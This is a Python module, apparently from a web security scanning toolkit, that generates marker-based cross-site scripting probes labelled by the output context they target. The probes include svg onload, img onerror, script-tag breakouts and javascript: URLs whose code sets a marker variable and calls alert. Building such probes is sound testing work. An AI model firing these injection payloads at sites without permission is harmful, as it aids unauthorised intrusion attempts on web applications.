from __future__ import annotations

import secrets
from dataclasses import dataclass


@dataclass(frozen=True)
class XssPayload:
    context: str
    payload: str


def new_marker() -> str:
    return f"bbtkxss{secrets.token_hex(6)}"


def payloads_for_marker(marker: str, include_context: bool = False) -> list[str]:
    payloads = [
        marker,
        f"{marker}\"'",
        f"<{marker}>",
        f'">{marker}<',
    ]
    if not include_context:
        return payloads

    value = "'" + marker.replace("\\", "\\\\").replace("'", "\\'") + "'"
    code = f"window.__bbtk_xss_marker={value};alert({value})"
    return payloads + [
        f'"><svg onload="{code}">',
        f"</script><script>{code}</script>",
        f"javascript:{code}",
    ]


def payload_cases_for_marker(marker: str, include_context: bool = False) -> list[XssPayload]:
    """Return harmless marker probes labeled with the output context they target."""
    payloads = [
        XssPayload("plain_value", marker),
        XssPayload("quoted_value", f"{marker}\"'"),
        XssPayload("html_text", f"<{marker}>"),
        XssPayload("attribute_boundary", f'">{marker}<'),
    ]
    if not include_context:
        return payloads

    value = "'" + marker.replace("\\", "\\\\").replace("'", "\\'") + "'"
    code = f"window.__bbtk_xss_marker={value};alert({value})"
    payloads.extend(
        [
            XssPayload("html_event_attribute", f'"><svg onload="{code}">'),
            XssPayload("attribute_event", f'" autofocus onfocus="{code}" x="'),
            XssPayload("script", f"</script><script>{code}</script>"),
            XssPayload("url", f"javascript:{code}"),
            XssPayload("without_angle_brackets", f'" autofocus onfocus="{code}" x="'),
            XssPayload("dom_inner_html", f'<img src=x onerror="{code}">'),
            XssPayload("dom_document_write", f'</script><img src=x onerror="{code}">'),
        ]
    )
    return payloads
